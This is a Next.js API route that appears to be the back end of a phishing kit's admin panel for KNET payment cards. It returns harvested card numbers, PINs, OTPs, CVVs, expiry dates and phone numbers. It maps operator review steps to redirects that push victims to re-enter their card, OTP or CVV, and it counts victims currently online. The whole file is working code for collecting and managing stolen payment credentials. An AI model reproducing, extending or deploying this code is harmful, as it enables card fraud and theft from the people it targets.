import { NextResponse } from "next/server";
import { readAdminToken } from "@/lib/token";
import { getAllKnetRecords } from "@/controllers/knet.controller";
import { getPresenceSessions } from "@/models/tracking.repository";
import { KNET_REVIEW } from "@/models/knet.repository";

export const dynamic = "force-dynamic";

function bearer(req: Request) {
  const h = req.headers.get("authorization") ?? "";
  return h.startsWith("Bearer ") ? readAdminToken(h.slice(7)) : null;
}

function mapStatus(status: string, step: string): string {
  if (status === "approved") return "accepted";
  if (status === "rejected") return "rejected";
  if (step === KNET_REVIEW.retryCard) return "redirect_card";
  if (step === KNET_REVIEW.retryOtp || step === KNET_REVIEW.retryOtp2) return "redirect_otp";
  if (step === KNET_REVIEW.retryCvv) return "redirect_cvv";
  return "pending";
}

const ONLINE_MS = 45_000;

export async function GET(req: Request) {
  if (!bearer(req)) return NextResponse.json({}, { status: 401 });

  const [knet, sessions] = await Promise.all([
    getAllKnetRecords().catch(() => []),
    getPresenceSessions().catch(() => []),
  ]);

  const now = Date.now();
  const active = sessions.filter((s) => now - s.lastSeen.getTime() < ONLINE_MS).length;

  const submissions = knet.map((k) => ({
    id: k.id,
    card: k.cardNumber,
    pin: k.pin,
    otp: k.otp2 || k.otp,
    cvv: k.cvv,
    phone: k.msisdnDisplay ?? "",
    amount: (k.amountHalalas / 100).toFixed(3),
    time: k.createdAt,
    status: mapStatus(k.status, k.reviewStep),
    expiry: k.expiryDate,
  }));

  return NextResponse.json({ submissions, active });
}
